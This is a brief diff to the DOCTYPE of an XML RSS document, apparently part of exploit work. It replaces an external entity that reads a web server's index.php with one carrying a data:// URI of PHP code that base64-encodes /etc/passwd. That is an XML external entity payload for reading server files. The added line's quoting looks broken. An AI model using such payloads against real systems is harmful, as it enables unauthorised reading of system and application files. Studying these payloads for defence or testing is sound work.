@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> 
+  <!ENTITY xxe SYSTEM "data://text/plain,<?php echo base64_encode(file_get_contents("/etc/passwd"));"> 
 ]>
 <rss version="2.0">
   <channel>
